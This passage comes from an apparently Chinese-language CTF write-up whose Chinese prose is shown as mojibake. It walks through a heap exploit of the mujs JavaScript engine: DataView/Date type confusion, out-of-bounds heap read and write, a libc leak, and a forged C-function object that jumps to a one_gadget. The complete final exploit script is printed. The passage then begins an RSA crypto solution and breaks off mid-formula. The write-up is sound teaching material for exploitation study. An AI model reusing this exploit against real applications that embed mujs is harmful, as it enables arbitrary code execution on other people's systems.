</span></span><span class=line><span class=cl>        <span class=k>enum</span> <span class=n>js_Class</span> <span class=n>type</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=kt>int</span> <span class=n>extensible</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>js_Property</span> <span class=o>*</span><span class=n>properties</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=kt>int</span> <span class=n>count</span><span class=p>;</span> 
</span></span><span class=line><span class=cl>        <span class=n>js_Object</span> <span class=o>*</span><span class=n>prototype</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>union</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=kt>int</span> <span class=n>boolean</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=kt>double</span> <span class=n>number</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=k>struct</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                        <span class=k>const</span> <span class=kt>char</span> <span class=o>*</span><span class=n>string</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                        <span class=kt>int</span> <span class=n>length</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=p>}</span> <span class=n>s</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=k>struct</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                        <span class=kt>int</span> <span class=n>length</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=p>}</span> <span class=n>a</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=k>struct</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                        <span class=n>js_Function</span> <span class=o>*</span><span class=n>function</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                        <span class=n>js_Environment</span> <span class=o>*</span><span class=n>scope</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=p>}</span> <span class=n>f</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=k>struct</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                        <span class=k>const</span> <span class=kt>char</span> <span class=o>*</span><span class=n>name</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                        <span class=n>js_CFunction</span> <span class=n>function</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                        <span class=n>js_CFunction</span> <span class=n>constructor</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                        <span class=kt>int</span> <span class=n>length</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                        <span class=kt>void</span> <span class=o>*</span><span class=n>data</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                        <span class=n>js_Finalize</span> <span class=n>finalize</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=p>}</span> <span class=n>c</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=n>js_Regexp</span> <span class=n>r</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=k>struct</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                        <span class=n>js_Object</span> <span class=o>*</span><span class=n>target</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                        <span class=n>js_Iterator</span> <span class=o>*</span><span class=n>head</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=p>}</span> <span class=n>iter</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=k>struct</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                        <span class=k>const</span> <span class=kt>char</span> <span class=o>*</span><span class=n>tag</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                        <span class=kt>void</span> <span class=o>*</span><span class=n>data</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                        <span class=n>js_HasProperty</span> <span class=n>has</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                        <span class=n>js_Put</span> <span class=n>put</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                        <span class=n>js_Delete</span> <span class=n>delete</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                        <span class=n>js_Finalize</span> <span class=n>finalize</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=p>}</span> <span class=n>user</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=k>struct</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                    <span class=kt>uint32_t</span> <span class=n>length</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                    <span class=kt>uint8_t</span><span class=o>*</span> <span class=n>data</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=p>}</span> <span class=n>dataview</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span> <span class=n>u</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=c1>// ...
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>};</span>
</span></span></code></pre></td></tr></table></div></div><p>æ¯”å¦‚<code>js_Object.u.dataview.length</code> åœ¨ç»“æ„ä½“å†…æ‰€å¤„çš„åç§»æ˜¯å’Œ<code>js_Object.u.number</code> ä»¥åŠ<code>s_Object.u.c.name</code>è¿™ä¸¤ä¸ªæ˜¯ç›¸åŒçš„ã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä¿®æ”¹<code>js_Object.u.number</code>ï¼Œé˜Ÿå‹æ‰¾åˆ°äº†ä¸‹é¢çš„ä»£ç </p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=k>static</span> <span class=kt>void</span> <span class=nf>js_setdate</span><span class=p>(</span><span class=n>js_State</span> <span class=o>*</span><span class=n>J</span><span class=p>,</span> <span class=kt>int</span> <span class=n>idx</span><span class=p>,</span> <span class=kt>double</span> <span class=n>t</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>js_Object</span> <span class=o>*</span><span class=n>self</span> <span class=o>=</span> <span class=nf>js_toobject</span><span class=p>(</span><span class=n>J</span><span class=p>,</span> <span class=n>idx</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>self</span><span class=o>-&gt;</span><span class=n>type</span> <span class=o>!=</span> <span class=n>JS_CDATE</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=nf>js_typeerror</span><span class=p>(</span><span class=n>J</span><span class=p>,</span> <span class=s>&#34;not a date&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>self</span><span class=o>-&gt;</span><span class=n>u</span><span class=p>.</span><span class=n>number</span> <span class=o>=</span> <span class=nf>TimeClip</span><span class=p>(</span><span class=n>t</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>js_pushnumber</span><span class=p>(</span><span class=n>J</span><span class=p>,</span> <span class=n>self</span><span class=o>-&gt;</span><span class=n>u</span><span class=p>.</span><span class=n>number</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=c1>// ... called from here
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>static</span> <span class=kt>void</span> <span class=nf>Dp_setTime</span><span class=p>(</span><span class=n>js_State</span> <span class=o>*</span><span class=n>J</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>js_setdate</span><span class=p>(</span><span class=n>J</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=nf>js_tonumber</span><span class=p>(</span><span class=n>J</span><span class=p>,</span> <span class=mi>1</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>è®©æˆ‘ä»¬è¯•ä¸€ä¸‹</p><p><code>JS_CDATE</code>çš„å€¼æ˜¯10ï¼Œæˆ‘ä»¬éœ€è¦æŠŠè¿™ä¸ªDataViewç»“æ„çš„typeå­—æ®µæº¢å‡ºæˆ10å°±å¯ä»¥äº†</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=nx>b</span> <span class=o>=</span> <span class=nx>DataView</span><span class=p>(</span><span class=mh>0x68</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>a</span> <span class=o>=</span> <span class=nx>DataView</span><span class=p>(</span><span class=mh>0x48</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>b</span> <span class=o>=</span> <span class=nx>DataView</span><span class=p>(</span><span class=mh>0x48</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>c</span> <span class=o>=</span> <span class=nx>DataView</span><span class=p>(</span><span class=mh>0x48</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>print</span><span class=p>(</span><span class=nx>c</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nx>b</span><span class=p>.</span><span class=nx>setUint8</span><span class=p>(</span><span class=mh>0x48</span><span class=o>+</span><span class=mi>8</span><span class=p>,</span> <span class=mi>10</span><span class=p>);</span> <span class=c1>// set type of c to Date
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>print</span><span class=p>(</span><span class=nx>c</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nx>c</span><span class=p>.</span><span class=nx>setTime</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>ç»“æœï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>[object DataView]
</span></span><span class=line><span class=cl>[object Date]
</span></span><span class=line><span class=cl>TypeError: undefined is not callable
</span></span><span class=line><span class=cl>        at tconf.js:10
</span></span></code></pre></td></tr></table></div></div><p>Emmmï¼Œå±…ç„¶æ˜¯æŠ¥é”™äº†ã€‚éš¾é“è¿›è¡Œäº†ç±»å‹æ··æ·†è¿˜æ˜¯ä¸èƒ½è°ƒç”¨setTimeæ–¹æ³•ä¹ˆï¼Ÿé˜Ÿå‹æ›¾ç»ä¸ºäº†è¿™ä¸ªé—®é¢˜å›°æ‰°äº†è®¸ä¹…ï¼Œä»–æ„è¯†åˆ°äº†å¯¹è±¡çš„prototype åœ¨æˆ‘ä»¬ä¸€åˆ›å»ºçš„æ—¶å€™å…¶å®å°±å·²ç»ç¡®å®šäº†ã€‚æ‰€ä»¥å½“æˆ‘ä»¬æ”¹å˜typeçš„æ—¶å€™prototypeå¹¶æ²¡æœ‰æ”¹å˜ã€‚è€ŒprototypeåŸºæœ¬å°±å·²ç»å®šä¹‰äº†è¿™ä¸ªå¯¹è±¡å¯ä»¥è°ƒç”¨å“ªäº›æ–¹æ³•ï¼Œå¯æ¶ã€‚</p><p>è¿™æ—¶æ— æ•Œçš„é˜Ÿå‹å‘ç°ï¼Œjsé‡Œæœ‰ä¸ªè®¨åŒçš„ä¸œè¥¿å« <code>this</code>ï¼Œè¿™ä¸ªä¸œè¥¿åœ¨è¿™ä¸ªæ—¶å€™ç®—æ˜¯é›ªä¸­é€ç¢³å§</p><p>æˆ‘ä»¬ä»ç„¶å¯ä»¥é€šè¿‡jsçš„<code>bind</code>è°ƒç”¨<code>setTime</code> :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=nb>Date</span><span class=p>.</span><span class=nx>prototype</span><span class=p>.</span><span class=nx>setTime</span><span class=p>.</span><span class=nx>bind</span><span class=p>(</span><span class=nx>c</span><span class=p>)(</span><span class=mi>12</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>æˆåŠŸäº†ï¼</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=nx>b</span> <span class=o>=</span> <span class=nx>DataView</span><span class=p>(</span><span class=mh>0x68</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>a</span> <span class=o>=</span> <span class=nx>DataView</span><span class=p>(</span><span class=mh>0x48</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>b</span> <span class=o>=</span> <span class=nx>DataView</span><span class=p>(</span><span class=mh>0x48</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>c</span> <span class=o>=</span> <span class=nx>DataView</span><span class=p>(</span><span class=mh>0x48</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>print</span><span class=p>(</span><span class=nx>c</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nx>b</span><span class=p>.</span><span class=nx>setUint8</span><span class=p>(</span><span class=mh>0x48</span><span class=o>+</span><span class=mi>8</span><span class=p>,</span> <span class=mi>10</span><span class=p>);</span> <span class=c1>// set type of c to Date
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>print</span><span class=p>(</span><span class=nx>c</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>Date</span><span class=p>.</span><span class=nx>prototype</span><span class=p>.</span><span class=nx>setTime</span><span class=p>.</span><span class=nx>bind</span><span class=p>(</span><span class=nx>c</span><span class=p>)(</span><span class=mf>1.09522</span><span class=nx>e</span><span class=o>+</span><span class=mi>12</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>b</span><span class=p>.</span><span class=nx>setUint8</span><span class=p>(</span><span class=mh>0x48</span><span class=o>+</span><span class=mi>8</span><span class=p>,</span> <span class=mi>16</span><span class=p>);</span> <span class=c1>// type of c back to DataView
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>print</span><span class=p>(</span><span class=nx>c</span><span class=p>.</span><span class=nx>getLength</span><span class=p>())</span>
</span></span></code></pre></td></tr></table></div></div><p>çœ‹åˆ°è¿™é‡Œå¤§å®¶å¯èƒ½ä¼šæœ‰äº›ç–‘é—®ï¼Œå°±æ˜¯<code>u.number</code>æ˜¯8å­—èŠ‚çš„<code>double</code>ç±»å‹ï¼Œè€Œæˆ‘ä»¬è¦è¦†ç›–çš„<code>u.dataview.length</code>åªæœ‰å››å­—èŠ‚ï¼Œè¿™æ ·ä¼šä¸ä¼šè¦†ç›–åˆ°åé¢ç´§è·Ÿç€çš„å››å­—èŠ‚çš„<code>u.dataview.data</code>ï¼Œæ¯•ç«Ÿè¿™ä¸ªæ˜¯ä¸ªæŒ‡é’ˆï¼Œè¦†ç›–æ‰äº†å®¹æ˜“å¯¼è‡´crashã€‚å…¶å®æ˜¯ä¸ä¼šçš„ï¼Œå› ä¸ºè¿™ä¸ªç»“æ„ä½“æœ‰8å­—èŠ‚å¯¹é½ã€‚</p><h4 id=ä½¿ç”¨å †ä¸Šçš„è¶Šç•Œè¯»å†™æ¥å®ç°ä»£ç æ‰§è¡Œ>ä½¿ç”¨å †ä¸Šçš„è¶Šç•Œè¯»å†™æ¥å®ç°ä»£ç æ‰§è¡Œ</h4><p>åˆ°äº†è¿™ä¸ªé˜¶æ®µï¼Œæˆ‘ä»¬å·²ç»å¯ä»¥é€šè¿‡ä¿®æ”¹dataviewçš„lengthå­—æ®µæ¥å®ç°å †ä¸Šçš„ä»»æ„åœ°å€è¯»å†™äº†ã€‚å¹¶ä¸”å †å¸ƒå±€ä¹Ÿæ˜¯æˆ‘ä»¬ç›¸å¯¹å¯æ§çš„äº†ã€‚ä¸ºäº†æ›´å¥½çš„æ§åˆ¶å †ä¸Šçš„ç»“æ„ï¼Œæˆ‘çš„é˜Ÿå‹åœ¨<code>c</code>åé¢åˆç”³è¯·äº†ä¸¤ä¸ªDataviewã€‚å¹¶ä¸”æˆ‘ä»¬çŸ¥é“ï¼Œå¦‚æœæˆ‘ä»¬ç”³è¯·çš„å †çš„å¤§å°å¤§äº128kçš„è¯æˆ‘ä»¬ä¼šä½¿ç”¨mmapæ¥ç”³è¯·ç©ºé—´ï¼Œè¿™ä¸ªæ˜¯mallocå‡½æ•°çš„ä¸€ä¸ªç­–ç•¥ã€‚è€Œè¿™ä¸ªmappçš„åœ°å€å¾€å¾€è·ç¦»libcåœ°å€å¾ˆè¿‘ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™ç§æ–¹æ³•æ¥æ³„æ¼libcåŸºåœ°å€ã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬ç”¨ä¸Šè¿°çš„æ–¹æ³•æ³„æ¼äº†libcåœ°å€ä¹‹åï¼Œå¯ä»¥ä¼ªé€ ä¸€ä¸ª<code>JS_CCFUNCTION</code>ç±»å‹ï¼Œä»–æœ‰ä¸€ä¸ªå­—æ®µå«åš<code>u.c.function</code>æˆ‘ä»¬å¯ä»¥è½»æ˜“ç”¨ä¸‹é¢çš„æ–¹å¼è°ƒç”¨è¿™ä¸ªå‡½æ•°æŒ‡é’ˆ</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>void</span> <span class=nf>js_call</span><span class=p>(</span><span class=n>js_State</span> <span class=o>*</span><span class=n>J</span><span class=p>,</span> <span class=kt>int</span> <span class=n>n</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl><span class=c1>// ...
</span></span></span><span class=line><span class=cl><span class=c1></span>                        <span class=nf>jsR_callfunction</span><span class=p>(</span><span class=n>J</span><span class=p>,</span> <span class=n>n</span><span class=p>,</span> <span class=n>obj</span><span class=o>-&gt;</span><span class=n>u</span><span class=p>.</span><span class=n>f</span><span class=p>.</span><span class=n>function</span><span class=p>,</span> <span class=n>obj</span><span class=o>-&gt;</span><span class=n>u</span><span class=p>.</span><span class=n>f</span><span class=p>.</span><span class=n>scope</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=c1>// ...
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=æœ€ç»ˆexp>æœ€ç»ˆexp</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=nx>b</span> <span class=o>=</span> <span class=nx>DataView</span><span class=p>(</span><span class=mh>0x68</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>a</span> <span class=o>=</span> <span class=nx>DataView</span><span class=p>(</span><span class=mh>0x48</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>b</span> <span class=o>=</span> <span class=nx>DataView</span><span class=p>(</span><span class=mh>0x48</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>c</span> <span class=o>=</span> <span class=nx>DataView</span><span class=p>(</span><span class=mh>0x48</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>e</span> <span class=o>=</span> <span class=nx>DataView</span><span class=p>(</span><span class=mh>0x48</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>f</span> <span class=o>=</span> <span class=nx>DataView</span><span class=p>(</span><span class=mh>0x1000</span> <span class=o>*</span> <span class=mh>0x1000</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>b</span><span class=p>.</span><span class=nx>setUint8</span><span class=p>(</span><span class=mh>0x48</span><span class=o>+</span><span class=mi>8</span><span class=p>,</span> <span class=mi>10</span><span class=p>);</span> <span class=c1>// set c type to Date
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nb>Date</span><span class=p>.</span><span class=nx>prototype</span><span class=p>.</span><span class=nx>setTime</span><span class=p>.</span><span class=nx>bind</span><span class=p>(</span><span class=nx>c</span><span class=p>)(</span><span class=mf>1.09522</span><span class=nx>e</span><span class=o>+</span><span class=mi>12</span><span class=p>)</span> <span class=c1>// write number + length
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>b</span><span class=p>.</span><span class=nx>setUint8</span><span class=p>(</span><span class=mh>0x48</span><span class=o>+</span><span class=mi>8</span><span class=p>,</span> <span class=mi>16</span><span class=p>);</span> <span class=c1>// set c type back to DataView
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>sh32</span> <span class=o>=</span> <span class=mi>4294967296</span> <span class=c1>// 1&lt;&lt;32
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>libb_addr_off</span> <span class=o>=</span> <span class=mi>472</span>
</span></span><span class=line><span class=cl><span class=nx>libc_leak</span> <span class=o>=</span> <span class=nx>c</span><span class=p>.</span><span class=nx>getUint32</span><span class=p>(</span><span class=nx>libb_addr_off</span><span class=p>)</span> <span class=o>+</span> <span class=p>(</span><span class=nx>c</span><span class=p>.</span><span class=nx>getUint32</span><span class=p>(</span><span class=nx>libb_addr_off</span><span class=o>+</span><span class=mi>4</span><span class=p>)</span><span class=o>*</span><span class=nx>sh32</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>libc_off</span> <span class=o>=</span> <span class=mh>0x7ffff7c31000</span> <span class=o>-</span> <span class=mh>0x7ffff6bfe010</span> <span class=c1>// got this from gdb
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>libc_base</span> <span class=o>=</span> <span class=nx>libc_leak</span> <span class=o>+</span> <span class=nx>libc_off</span>
</span></span><span class=line><span class=cl><span class=nx>print</span><span class=p>(</span><span class=s1>&#39;libc base:&#39;</span><span class=p>,</span> <span class=nx>libc_base</span><span class=p>.</span><span class=nx>toString</span><span class=p>(</span><span class=mi>16</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>one_gag</span> <span class=o>=</span> <span class=nx>libc_base</span> <span class=o>+</span> <span class=mh>0xe6c84</span>
</span></span><span class=line><span class=cl><span class=nx>print</span><span class=p>(</span><span class=s1>&#39;onegadget:&#39;</span><span class=p>,</span> <span class=nx>one_gag</span><span class=p>.</span><span class=nx>toString</span><span class=p>(</span><span class=mi>16</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>e_obj_off</span> <span class=o>=</span> <span class=mi>192</span>
</span></span><span class=line><span class=cl><span class=nx>c</span><span class=p>.</span><span class=nx>setUint8</span><span class=p>(</span><span class=mi>160</span><span class=p>,</span> <span class=mi>4</span><span class=p>)</span> <span class=c1>// this sets type to JS_CCFUNCTION
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=c1>// set lower 4 bytes of js_CFunction function
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>c</span><span class=p>.</span><span class=nx>setUint32</span><span class=p>(</span><span class=nx>e_obj_off</span><span class=o>+</span><span class=mi>8</span><span class=p>,</span> <span class=nx>one_gag</span><span class=o>&amp;</span><span class=mh>0xffffffff</span><span class=p>)</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// set upper 4 bytes of js_CFunction function
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>c</span><span class=p>.</span><span class=nx>setUint32</span><span class=p>(</span><span class=nx>e_obj_off</span><span class=o>+</span><span class=mi>8</span><span class=o>+</span><span class=mi>4</span><span class=p>,</span> <span class=nb>Math</span><span class=p>.</span><span class=nx>floor</span><span class=p>(</span><span class=nx>one_gag</span><span class=o>/</span><span class=nx>sh32</span><span class=p>)</span><span class=o>&amp;</span><span class=mh>0xffffffff</span><span class=p>)</span> 
</span></span><span class=line><span class=cl><span class=nx>e</span><span class=p>()</span> <span class=c1>// e is now a function so we can call it 
</span></span></span></code></pre></td></tr></table></div></div><p>é˜Ÿå‹è¡¨ç¤ºä»–ä¹‹å‰ä¹Ÿæ²¡åšè¿‡è¿™ç§mujsçš„åˆ©ç”¨ï¼Œä½†æ˜¯è¿™äº›å †åˆ©ç”¨çš„åŸºæœ¬æ€è·¯å’Œå¾ˆå¤šå¤§å‹é¡¹ç›®æ¯”å¦‚v8çš„åˆ©ç”¨æ˜¯å…±é€šçš„ï¼Œä½†æ˜¯é‚£äº›å¤§å‹é¡¹ç›®ç”±äºè¿è¡Œæ—¶æ›´ä¸ºå¤æ‚ï¼Œå †ç©ºé—´è¦ç›¸å¯¹æ›´ä¸å¯æ§ä¸€äº›ã€‚</p><h1 id=crypto>Crypto</h1><h2 id=large-case>large case</h2><p>æ€è·¯å¦‚ä¸‹ï¼š</p><p>è¿™é¢˜æ²¡æœ‰æä¾›eï¼Œç»™äº†pã€qã€rï¼Œå¹¶ä¸”æ¡ä»¶é‡Œè¯´äº†eç”±ä¸‰ä¸ªç´ å› å­ç»„æˆï¼Œæ‰€ä»¥ä¸éš¾æƒ³åˆ°åˆ†è§£p-1ï¼Œq-1ï¼Œr-1ï¼Œä»è€Œå¯¹eçš„å¯èƒ½å€¼è¿›è¡Œç»„åˆã€‚ä¸è¿‡å°±ç®—ç»„åˆè¿‡äº†ï¼Œä¹Ÿä¸èƒ½ç”¨å¸¸è§„æ–¹æ³•è§£é¢˜ï¼Œå› ä¸ºæœ¬é¢˜e phiä¸äº’ç´ ï¼Œæ‰€ä»¥è€ƒè™‘å¯¹å…¶å¼€æ ¹ï¼Œåˆè€ƒè™‘åˆ°è¿™é¢˜çš„eä¼šç›¸å¯¹è¾ƒå¤§ï¼Œæ‰€ä»¥ç”¨ammç®—æ³•å¯¹å…¶å¼€æ ¹ã€‚
åœ¨è¿™ä¹‹å‰å¯ä»¥å¯¹eçš„å› å­è¿›è¡ŒçŒœæµ‹ï¼Œç”±äºéœ€è¦ä½¿ç”¨åˆ°crtç»„åˆï¼Œæ‰€ä»¥å› å­ä¸ä¼šå¤ªå¤§ï¼Œå¹¶ä¸”å› å­ä¸ä¼šæ˜¯å…±æœ‰çš„å› æ•°ï¼Œäºæ˜¯å¯ä»¥çŒœæµ‹eä½¿ç”¨p-1ä¸­çš„757ï¼Œq-1ä¸­çš„66553ï¼Œr-1ä¸­çš„5156273ï¼ˆå¦‚æœä¸å¯¹ï¼Œå†è¿›è¡Œè°ƒæ•´ï¼Œå¯ä¾›è°ƒæ•´çš„é€‰æ‹©ä¸å¤šï¼Œä¸€äº›å°çš„å› æ•°æ¯”å¦‚3ã€7ï¼Œå¯ä»¥ç›´æ¥è·‘ï¼Œå¾ˆå¿«å°±å¯ä»¥çŸ¥é“ä¸æ»¡è¶³ï¼‰ã€‚
è¿™æ˜¯å¯ä»¥æ³¨æ„åˆ°flagçš„é•¿åº¦åœ¨1025-2048æ¯”ç‰¹ä¹‹é—´ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸éœ€è¦è€ƒè™‘rçš„éƒ¨åˆ†ï¼Œåªè€ƒè™‘pã€qã€‚æœ‰äº†çŒœæµ‹çš„eï¼Œæˆ‘ä»¬å°±å¯ä»¥æŠŠå¤šäº2048çš„padå»æ‰ï¼Œç•™ä¸‹ä¸€éƒ¨åˆ†\x00
$$c\equiv{m^e(2^{1024})^e}\pmod{n} $$
